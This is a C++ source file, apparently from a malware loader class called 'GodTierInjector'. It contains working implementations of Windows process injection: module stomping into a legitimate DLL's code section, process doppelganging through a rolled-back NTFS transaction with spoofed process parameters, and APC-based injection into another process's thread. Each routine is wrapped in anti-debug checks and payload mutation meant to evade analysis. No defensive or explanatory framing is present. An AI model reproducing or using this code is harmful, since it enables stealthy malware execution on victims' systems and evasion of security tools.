bool GodTierInjector::ModuleStompingInject(const std::wstring& legitimateDllPath,
                                           const std::vector<uint8_t>& rawData,
                                           bool applyMutation)
{
    if (AntiDebug::PerformAntiDebugChecks()) return false;

    auto payload = PreparePayload(rawData, applyMutation);

    HMODULE hModule = LoadLibraryW(legitimateDllPath.c_str());
    if (!hModule) return false;

    bool success = false;

    do {
        auto dos = (PIMAGE_DOS_HEADER)hModule;
        auto nt  = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos->e_lfanew);
        auto section = IMAGE_FIRST_SECTION(nt);

        PVOID textSection = nullptr;
        SIZE_T textSize = 0;

        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            if (memcmp(section[i].Name, ".text", 5) == 0) {
                textSection = (PVOID)((ULONG_PTR)hModule + section[i].VirtualAddress);
                textSize = section[i].Misc.VirtualSize;
                break;
            }
        }

        if (!textSection || payload.size() > textSize) break;

        PVOID baseAddr = textSection;
        SIZE_T regionSize = textSize;
        ULONG oldProtect = 0;

        if (!NT_SUCCESS(g_NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize,
                                                 PAGE_READWRITE, &oldProtect))) break;

        g_NtWriteVirtualMemory(GetCurrentProcess(), textSection, 
                               (PVOID)payload.data(), payload.size(), nullptr);

        baseAddr = textSection;
        regionSize = textSize;
        g_NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize,
                                 PAGE_EXECUTE_READ, &oldProtect);

        success = true;

    } while (false);

    return success;
}

bool GodTierInjector::DoppelgangingInject(const std::wstring& targetPath,
                                          const std::vector<uint8_t>& rawData,
                                          bool applyMutation)
{
    if (AntiDebug::PerformAntiDebugChecks()) return false;

    auto payload = PreparePayload(rawData, applyMutation);

    auto dos = (PIMAGE_DOS_HEADER)payload.data();
    auto nt  = (PIMAGE_NT_HEADERS)(payload.data() + dos->e_lfanew);

    HANDLE hTransaction = CreateTransaction(nullptr, nullptr, 0, 0, 0, 0, nullptr);
    if (hTransaction == INVALID_HANDLE_VALUE) return false;

    HANDLE hFile = CreateFileTransactedW(
        L"C:\\Windows\\Temp\\doppel_temp.bin",
        GENERIC_READ | GENERIC_WRITE,
        0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
        nullptr, hTransaction, nullptr, nullptr);

    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hTransaction);
        return false;
    }

    DWORD written = 0;
    WriteFile(hFile, payload.data(), (DWORD)payload.size(), &written, nullptr);

    HANDLE hSection = nullptr;
    LARGE_INTEGER maxSize = { (LONGLONG)payload.size() };

    NTSTATUS status = g_NtCreateSection(
        &hSection, SECTION_ALL_ACCESS, nullptr, &maxSize,
        PAGE_READONLY, SEC_IMAGE, hFile);

    if (!NT_SUCCESS(status)) {
        CloseHandle(hFile);
        CloseHandle(hTransaction);
        return false;
    }

    RollbackTransaction(hTransaction);
    CloseHandle(hFile);
    CloseHandle(hTransaction);

    HANDLE hProcess = nullptr;
    status = g_NtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        nullptr,
        GetCurrentProcess(),
        PS_INHERIT_HANDLES,
        hSection,
        nullptr,
        nullptr,
        FALSE
    );

    if (!NT_SUCCESS(status)) {
        CloseHandle(hSection);
        return false;
    }

    FixRelocations(hProcess, (PVOID)nt->OptionalHeader.ImageBase,
                   (PVOID)nt->OptionalHeader.ImageBase);

    PVOID imageBase  = (PVOID)nt->OptionalHeader.ImageBase;
    PVOID entryPoint = (PVOID)((ULONG_PTR)imageBase + nt->OptionalHeader.AddressOfEntryPoint);

    HANDLE hThread = nullptr;
    status = g_NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        nullptr,
        hProcess,
        entryPoint,
        nullptr,
        FALSE,
        0, 0, 0,
        nullptr
    );

    CloseHandle(hSection);

    if (!NT_SUCCESS(status)) {
        CloseHandle(hProcess);
        return false;
    }

    SetProcessParameters(hProcess, targetPath, targetPath,
                         L"C:\\Windows\\System32", L"Windows Host Process");

    g_NtResumeThread(hThread, nullptr);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return true;
}

bool GodTierInjector::ThreadlessInject(DWORD targetPid,
                                       const std::vector<uint8_t>& rawData,
                                       bool applyMutation)
{
    if (AntiDebug::PerformAntiDebugChecks()) return false;

    auto payload = PreparePayload(rawData, applyMutation);
    if (payload.empty()) return false;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) return false;

    bool success = false;

    do {
        HANDLE hThread = nullptr;
        THREADENTRY32 te32 = {};
        te32.dwSize = sizeof(THREADENTRY32);

        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) break;

        if (Thread32First(hSnapshot, &te32)) {
            do {
                if (te32.th32OwnerProcessID == targetPid) {
                    hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                    if (hThread) break;
                }
            } while (Thread32Next(hSnapshot, &te32));
        }
        CloseHandle(hSnapshot);

        if (!hThread) break;

        auto antiDebugCode = mutationEngine.GenerateAntiDebugStub(defaultParams);

        PVOID remoteMemory = nullptr;
        SIZE_T totalSize = antiDebugCode.size() + payload.size() + 0x1000;

        if (!NT_SUCCESS(g_NtAllocateVirtualMemory(hProcess, &remoteMemory, 0, &totalSize,
                                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
            CloseHandle(hThread);
            break;
        }

        if (!antiDebugCode.empty()) {
            g_NtWriteVirtualMemory(hProcess, remoteMemory, 
                                   antiDebugCode.data(), antiDebugCode.size(), nullptr);
        }

        PVOID payloadBase = (PVOID)((ULONG_PTR)remoteMemory + antiDebugCode.size());
        g_NtWriteVirtualMemory(hProcess, payloadBase, 
                               (PVOID)payload.data(), payload.size(), nullptr);

        ULONG oldProtect = 0;
        PVOID protectBase = remoteMemory;
        SIZE_T protectSize = totalSize;

        if (!NT_SUCCESS(g_NtProtectVirtualMemory(hProcess, &protectBase, &protectSize,
                                                 PAGE_EXECUTE_READ, &oldProtect))) {
            CloseHandle(hThread);
            break;
        }

        if (!NT_SUCCESS(g_NtQueueApcThread(hThread, (PAPCFUNC)remoteMemory, 
                                           nullptr, nullptr, nullptr))) {
            CloseHandle(hThread);
            break;
        }

        success = true;
        CloseHandle(hThread);

    } while (false);

    CloseHandle(hProcess);
    return success;
}

bool GodTierInjector::ExecuteStompedModule(PVOID address, bool wait) {
    if (!address) return false;

    HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)address, nullptr, 0, nullptr);
    if (!hThread) return false;

    if (wait) WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return true;
}
